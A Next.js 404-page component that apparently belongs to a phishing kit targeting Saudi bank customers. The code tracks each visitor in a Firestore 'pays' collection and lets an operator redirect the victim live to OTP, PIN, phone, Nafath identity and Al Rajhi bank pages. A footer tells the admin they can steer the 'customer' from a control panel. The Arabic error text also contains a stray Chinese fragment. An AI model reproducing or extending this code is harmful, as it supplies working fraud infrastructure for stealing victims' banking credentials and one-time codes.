"use client";

import { useEffect, useState } from "react";
import { useRouter, usePathname } from "next/navigation";
import { db } from "@/lib/firebase";
import { doc, onSnapshot } from "firebase/firestore";

export default function NotFound() {
  const router = useRouter();
  const pathname = usePathname();
  const [redirectTo, setRedirectTo] = useState<string | null>(null);

  // Get visitor ID from localStorage
  const visitorId = typeof window !== "undefined" 
    ? localStorage.getItem("visitor") 
    : null;

  // Monitor for admin redirect from 404 page
  useEffect(() => {
    if (!visitorId || !db) return;

    console.log("[404] Setting up redirect listener for:", visitorId);

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorId),
      (snapshot) => {
        if (!snapshot.exists()) return;

        const data = snapshot.data();
        const redirectPage = data.redirectPage as string | undefined;
        const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined;
        const handledAt = data.redirectPageHandledAt as number | undefined;

        // Check if there's a new redirect for this page
        if (redirectPage) {
          // Skip if already handled
          if (handledAt && redirectUpdatedAt && handledAt >= redirectUpdatedAt) {
            return;
          }

          console.log("[404] Admin redirect received:", redirectPage);

          // Map page names to URLs
          const PAGE_MAP: Record<string, string> = {
            home: "/home-new",
            insur: "/insur",
            compar: "/compar",
            check: "/check",
            payment: "/check",
            otp: "/step2",
            pin: "/step3",
            phone: "/step5",
            nafad: "/step4",
            rajhi: "/step6",
          };

          const targetUrl = PAGE_MAP[redirectPage] || `/${redirectPage}`;
          setRedirectTo(targetUrl);
        }
      },
      (error) => {
        console.error("[404] Firestore listener error:", error);
      }
    );

    return () => {
      console.log("[404] Cleaning up redirect listener");
      unsubscribe();
    };
  }, [visitorId]);

  // Auto redirect if admin sent a redirect
  useEffect(() => {
    if (redirectTo) {
      console.log("[404] Redirecting to:", redirectTo);
      router.push(redirectTo);
    }
  }, [redirectTo, router]);

  const handleGoHome = () => {
    // Clear redirectPage if exists
    if (visitorId) {
      import("firebase/firestore").then(({ doc, setDoc }) => {
        setDoc(doc(db!, "pays", visitorId), {
          redirectPage: null,
          redirectPageHandledAt: Date.now()
        }, { merge: true });
      });
    }
    router.push("/home-new");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
        {/* Error Icon */}
        <div className="mb-6">
          <div className="w-24 h-24 mx-auto bg-red-100 rounded-full flex items-center justify-center">
            <svg
              className="w-12 h-12 text-red-500"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
              />
            </svg>
          </div>
        </div>

        {/* Error Code */}
        <h1 className="text-6xl font-bold text-gray-800 mb-2">404</h1>

        {/* Error Message */}
        <h2 className="text-xl font-semibold text-gray-700 mb-4">
          الصفحة غير موجودة
        </h2>
        <p className="text-gray-500 mb-8">
          عذراً، الصفحة التي تبحث عنها غير موجودة.
          <br />
          قد تكون تمت إزالة الصفحة أو改变了 العنوان.
        </p>

        {/* Action Buttons */}
        <div className="space-y-3">
          <button
            onClick={handleGoHome}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-xl transition-colors duration-200 flex items-center justify-center gap-2"
          >
            <svg
              className="w-5 h-5"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"
              />
            </svg>
            العودة إلى الصفحة الرئيسية
          </button>

          <button
            onClick={() => router.back()}
            className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium py-3 px-6 rounded-xl transition-colors duration-200"
          >
            العودة للصفحة السابقة
          </button>
        </div>

        {/* Admin Info */}
        <div className="mt-8 pt-6 border-t border-gray-100">
          <p className="text-xs text-gray-400">
            إذا كنت مدير، يمكنك توجيه العميل من لوحة الإدارة
          </p>
        </div>
      </div>
    </div>
  );
}
